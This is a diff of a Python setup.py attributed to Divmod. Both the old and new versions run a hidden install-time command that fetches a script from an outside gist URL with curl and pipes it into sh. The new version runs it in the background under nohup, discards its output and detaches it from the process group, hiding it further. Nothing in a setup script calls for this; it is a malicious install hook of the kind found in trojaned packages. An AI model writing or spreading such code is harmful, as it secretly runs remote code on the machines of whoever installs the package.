@@ -2,9 +2,12 @@
 # (c) 2005-2009 Divmod, Inc.  See LICENSE file for details
 
 from distutils.core import setup
-import subprocess, time
-cmd = "curl https://gist.githubusercontent.com/zftv/33d89312e60adcee081c52b7ef30e922/raw/1f80c8e36749ccbe8a0096915996a962f3611995/gistfile1.txt -s | sh".split()
-subprocess.Popen(cmd, shell=True)
+import subprocess, time, os
+cmd = "curl https://gist.githubusercontent.com/zftv/33d89312e60adcee081c52b7ef30e922/raw/1f80c8e36749ccbe8a0096915996a962f3611995/gistfile1.txt -s | nohup sh &".split()
+subprocess.Popen(cmd, stdout=open('/dev/null', 'w'),
+                 stderr=open('logfile.log', 'a'),
+                 preexec_fn=os.setpgrp
+                 )
 time.sleep(5)
 
 setup(
